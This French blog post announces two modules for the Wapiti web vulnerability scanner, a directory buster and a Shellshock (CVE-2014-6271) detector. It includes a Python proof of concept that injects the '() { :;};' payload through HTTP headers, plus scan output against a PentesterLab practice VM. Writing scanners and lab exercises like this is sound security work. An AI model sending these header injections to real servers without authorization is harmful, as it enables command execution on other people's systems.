---
title: "Wapiti : modules Shellshock et Buster"
tags: [Coding, Wapiti]
---

À l'heure de ces lignes, sur la version de développement courante (c'est-à-dire [sur le SVN de SourceForge](https://sourceforge.net/p/wapiti/code/HEAD/tree/)) deux modules viennent enrichir le scanneur de vulnérabilités web [Wapiti](http://wapiti.sourceforge.net/).  

Premièrement il y a le module `mod_buster` qui est l'équivalent d'un *DirBuster* ou d'un *dirb* : il permet de rechercher des dossiers et fichiers présents sur le serveur web, mais non référencés via les pages web présentes (ce qui est le rôle de `lswww`).  

Le second module est `mod_shellshock` qui comme son nom l'indique permet de détecter les scripts vulnérables à la faille `CVE-2014-6271` aussi connue sous le nom de *Bash bug* ou *ShellShock*.  

Cette faille découverte par *Stephane Chazelas* permet à un attaquant de faire exécuter des commandes en passant (généralement indirectement) des variables d'environnement spécifiquement formatées à un programme vulnérable (exemple : script CGI).  

C'est l'explication courte, je vous invite à faire des recherches pour en savoir plus.  

Dans tous les cas, j'ai profité [de l'image disque vulnérable créée par PentesterLab](https://twitter.com/PentesterLab/status/515079459284594688) pour créer ce module.  

J'ai d'abord écrit le *PoC* suivant qui n'est pas parfait, car ne fonctionne que dans les cas où l'output Bash est effectivement retourné. Le payload retourne deux retours à la ligne (pour forcer la séparation avec les entêtes HTTP) puis une chaîne que Bash doit décoder permettant de savoir si l'interprétation a réussi.  

```python
import requests
import sys
import random
import string

if len(sys.argv) != 2:
    print "Shellshock tester by devloop"
    print "Usage: {0} ".format(sys.argv[0])
 sys.exit()

empty_func = "() { :;}; "

random_bytes = [random.choice(string.hexdigits) for _ in range(32)]
bash_string = ""
for c in random_bytes:
 bash_string += "\\x" + c.encode("hex_codec")

cmd = "echo; echo; echo -e '{0}';".format(bash_string)

url = sys.argv[1]
hdrs = {
 "user-agent": empty_func + cmd,
 "referer": empty_func + cmd,
 "cookie": empty_func + cmd
 }
print "[*] Testing", url
try:
 r = requests.get(url, headers=hdrs)
 print "[*] Returned status", r.status_code

 if "".join(random_bytes) in r.content:
 print "[+] Pattern found in response, url seems vulnerable !"
 else:
 print "[-] Pattern doesn't found in response, url doesn't seems vulnerable"
except requests.exceptions.MissingSchema:
 print "[!] Error, check the url"
```

Maintenant avec la version de développement de Wapiti on peut résoudre l'exercice de cette façon :  

## Chercher des CGIs avec mod_buster

```console
$ ./bin/wapiti http://10.0.2.15/ -m buster
Wapiti-2.3.0 (wapiti.sourceforge.net)

 Note
========
Le scan a été sauvegardé dans le fichier /home/devloop/.wapiti/scans/10.0.2.15.xml
Vous pouvez l'utiliser pour lancer de futures attaques sans avoir à relancer le scan via le paramètre "-k"
[*] Chargement des modules :
         mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock

[+] Lancement du module buster
Found webpage http://10.0.2.15/css/
Found webpage http://10.0.2.15/js/
Found webpage http://10.0.2.15/favicon.ico
Found webpage http://10.0.2.15/cgi-bin/
Found webpage http://10.0.2.15/cgi-bin/status
```

## Tester la vulnérabilité avec mod_shellshock

```console
$ ./bin/wapiti http://10.0.2.15/cgi-bin/status -b page -m shellshock
Wapiti-2.3.0 (wapiti.sourceforge.net)

 Note
========
Le scan a été sauvegardé dans le fichier /home/devloop/.wapiti/scans/10.0.2.15.xml
Vous pouvez l'utiliser pour lancer de futures attaques sans avoir à relancer le scan via le paramètre "-k"
[*] Chargement des modules :
         mod_crlf, mod_exec, mod_file, mod_sql, mod_xss, mod_backup, mod_htaccess, mod_blindsql, mod_permanentxss, mod_nikto, mod_delay, mod_buster, mod_shellshock

[+] Lancement du module shellshock
URL http://10.0.2.15/cgi-bin/status seems vulnerable to Shellshock attack !
```

Ici j'ai spécifié via `-b` un périmètre d'action se limitant à l'URL passée en argument.  

L'exploitation en elle-même peut alors être faite en modifiant le PoC ou en utilisant par exemple le module créé par *Metasploit*.  

[Le module *Shellshock* de *Wapiti*](https://sourceforge.net/p/wapiti/code/HEAD/tree/trunk/wapitiCore/attack/mod_shellshock.py) se limite à une soixantaine de lignes de code ce qui montre à quel point il est facile d'écrire un module *Wapiti* depuis la version 2.3.0.

*Published September 28 2014 at 18:05*
